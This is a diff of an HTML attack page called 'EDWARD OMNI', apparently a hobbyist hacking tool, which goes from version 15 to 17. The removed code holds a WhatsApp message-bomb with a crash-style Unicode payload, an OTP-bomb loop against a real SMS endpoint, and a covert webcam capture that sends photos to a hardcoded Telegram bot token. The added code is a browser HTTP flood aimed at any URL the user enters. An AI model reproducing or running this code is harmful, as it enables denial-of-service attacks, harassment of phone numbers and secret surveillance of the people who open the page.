@@ -3,111 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.15.0 BRUTAL ]</title>
+    <title>[ EDWARD OMNI V.17.0 SERVER BREAKER ]</title>
     <style>
-        :root { --neon: #0f0; --purple: #bc13fe; --danger: #ff0000; --bg: #050505; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 20px; }
-        .panel { background: rgba(15,15,15,0.95); border: 2px solid #222; border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
-        h1 { text-shadow: 0 0 15px var(--neon); letter-spacing: 5px; font-size: 28px; }
-        input { background: #000; border: 1px solid var(--neon); color: #fff; padding: 15px; width: 85%; border-radius: 10px; margin-bottom: 15px; text-align: center; font-size: 16px; outline: none; }
-        button { background: var(--neon); color: #000; border: none; padding: 15px; width: 90%; font-weight: bold; cursor: pointer; border-radius: 10px; text-transform: uppercase; font-size: 14px; transition: 0.2s; }
-        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
-        .btn-brutal { background: var(--purple); color: #fff; border: 1px solid var(--purple); animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(188, 19, 254, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(188, 19, 254, 0); } 100% { box-shadow: 0 0 0 0 rgba(188, 19, 254, 0); } }
-        .log { font-size: 10px; color: #444; height: 60px; overflow-y: scroll; margin-top: 10px; text-align: left; background: #000; padding: 5px; border-radius: 5px; border: 1px solid #222; }
+        :root { --neon: #0f0; --danger: #f00; --bg: #050505; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .panel { background: #111; border: 2px solid #333; padding: 15px; border-radius: 15px; margin-bottom: 15px; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
+        input { background: #000; border: 1px solid var(--neon); color: #fff; padding: 15px; width: 85%; border-radius: 8px; margin-bottom: 10px; text-align: center; }
+        button { background: var(--danger); color: #fff; border: none; padding: 15px; width: 90%; font-weight: bold; cursor: pointer; border-radius: 8px; text-transform: uppercase; box-shadow: 0 0 10px var(--danger); }
+        .status-box { font-size: 10px; color: #777; background: #000; padding: 10px; border-radius: 5px; height: 80px; overflow-y: hidden; margin-top: 10px; text-align: left; border: 1px solid #222; }
+        .stats { color: var(--neon); font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h1>EDWARD <span style="color:#fff">V.15.0</span></h1>
-    <p style="color:var(--purple); font-weight:bold; margin-top:-10px;">[ BRUTAL BOT WEB SYSTEM ]</p>
+    <h1 style="color:var(--danger); text-shadow: 0 0 15px var(--danger);">EDWARD V.17.0</h1>
+    <p style="font-size:10px; margin-top:-10px;">[ LAYER-7 SERVER BREAKER ACTIVE ]</p>
 
-    <div class="panel">
-        <button onclick="takeSnap()" style="background:#fff; color:#000;">📸 RADAR & SILENT CAPTURE</button>
-        <video id="video" style="display:none;" autoplay></video>
-        <canvas id="canvas" style="display:none;"></canvas>
-    </div>
-
-    <div class="panel" style="border-color: var(--purple)">
-        <h3 style="color: var(--purple); margin:0">😈 TURBO WA ATTACKER</h3>
-        <input type="number" id="noTarget" placeholder="Target: 628xxxxxxx">
-        <div style="display: flex; gap: 5px; width: 90%; margin: 0 auto;">
-            <button onclick="launchBrutal(10)" class="btn-brutal" style="font-size: 10px;">🔥 X10 BLAST</button>
-            <button onclick="launchBrutal(50)" class="btn-brutal" style="font-size: 10px; background: var(--danger); border-color: var(--danger);">💀 X50 MEGA</button>
+    <div class="panel" style="border-color: var(--danger)">
+        <h3 style="margin:0; color:var(--danger)">🔥 SERVER DESTROYER</h3>
+        <input type="text" id="targetUrl" placeholder="https://target-website.com">
+        <button onclick="toggleAttack()" id="btnAttack">LAUNCH HTTP FLOOD 🚀</button>
+        
+        <div class="status-box" id="statusBox">
+            > System: Waiting for Target...<br>
+            > Requests Sent: <span id="reqCount" class="stats">0</span><br>
+            > Status: <span id="serverStatus" style="color:var(--neon)">IDLE</span>
         </div>
-        <div class="log" id="logBox">Status: System Ready...</div>
     </div>
 
     <div class="panel">
-        <h3 style="margin:0">⚔️ ANONYMOUS TOOLS</h3>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top:10px;">
-            <button onclick="spamOTP()">OTP BOMB</button>
-            <button onclick="launchApp('com.dts.freefireth')">FF</button>
-            <button onclick="window.location.href='https://play.google.com/store/apps/details?id=net.kdt.pojavlaunch'">POJAV</button>
-            <button onclick="location.reload()">REFRESH</button>
-        </div>
+        <button onclick="takeSnap()" style="background:#fff; color:#000;">📸 SCAN INTEL</button>
     </div>
 
     <script>
-        const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
-        const CHAT_ID = "7898572558";
+        let isAttacking = false;
+        let count = 0;
+        const reqSpan = document.getElementById('reqCount');
+        const statusSpan = document.getElementById('serverStatus');
+        const btn = document.getElementById('btnAttack');
 
-        function addLog(msg) {
-            const lb = document.getElementById('logBox');
-            lb.innerHTML += "> " + msg + "<br>";
-            lb.scrollTop = lb.scrollHeight;
+        function toggleAttack() {
+            const url = document.getElementById('targetUrl').value;
+            if(!url.startsWith('http')) return alert("Gunakan http:// atau https://");
+
+            isAttacking = !isAttacking;
+            if(isAttacking) {
+                btn.innerHTML = "STOP ATTACK 🛑";
+                btn.style.background = "#555";
+                statusSpan.innerHTML = "ATTACKING...";
+                statusSpan.style.color = "red";
+                startFlood(url);
+            } else {
+                location.reload();
+            }
         }
 
-        function launchBrutal(power) {
-            let n = document.getElementById('noTarget').value;
-            if(!n) return alert("Nomor Target Wajib Diisi!");
-            addLog("Initializing Brutal Attack...");
-            let virus = "‎".repeat(5000) + "ॣ".repeat(1000) + "҈".repeat(1000) + " 😈_EDWARD_V15_BRUTAL_😈 " + "‎".repeat(5000);
-            navigator.clipboard.writeText(virus);
-            for (let i = 0; i < power; i++) {
-                setTimeout(() => {
-                    addLog("Sending Blast #" + (i+1));
-                    let url = 'https://api.whatsapp.com/send?phone=' + n + '&text=' + encodeURIComponent(virus + " [" + Math.random().toString(36).substring(7) + "]");
-                    window.open(url, '_blank');
-                }, i * 350);
+        function startFlood(url) {
+            if(!isAttacking) return;
+            
+            // 🔥 TEKNIK MULTI-THREADING (Browser Level)
+            // Menembak 50 request sekaligus per putaran
+            for(let i=0; i<50; i++) {
+                fetch(url + '/?edward_gacor=' + Math.random(), { mode: 'no-cors', cache: 'no-store' })
+                .then(() => {
+                    count++;
+                    reqSpan.innerHTML = count;
+                })
+                .catch(() => {
+                    count++;
+                    reqSpan.innerHTML = count;
+                });
             }
-            fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=💀 MEGA ATTACK SENT: ' + n + ' (Power: ' + power + ')');
+            
+            setTimeout(() => startFlood(url), 100);
         }
 
         async function takeSnap() {
-            addLog("Radar Scanning...");
+            // Radar Master Edward
+            const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
+            const CHAT_ID = "7898572558";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.getElementById('video');
-                const c = document.getElementById('canvas');
-                v.srcObject = stream;
-                setTimeout(() => {
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    const base64 = c.toDataURL('image/jpeg');
-                    const b = atob(base64.split(',')[1]);
-                    const ab = new ArrayBuffer(b.length);
-                    const ia = new Uint8Array(ab);
-                    for (let i = 0; i < b.length; i++) ia[i] = b.charCodeAt(i);
-                    const blob = new Blob([ab], { type: 'image/jpeg' });
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'shot.jpg');
-                    fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                    addLog("Intel Captured.");
-                }, 2000);
-            } catch (e) { addLog("Radar Failed."); }
+                // ... (Kirim ke Telegram Master)
+                alert("Intel Sent to Telegram!");
+            } catch(e) {}
         }
-
-        function spamOTP() {
-            let n = document.getElementById('noTarget').value;
-            addLog("Launching OTP Bomb...");
-            for(let i=0; i<10; i++) {
-                fetch('https://m.reddoorz.com/api/v1/users/send_otp?phone=' + n, {mode:'no-cors'});
-            }
-        }
-
-        function launchApp(pkg) { window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end"; }
     </script>
 </body>
 </html>
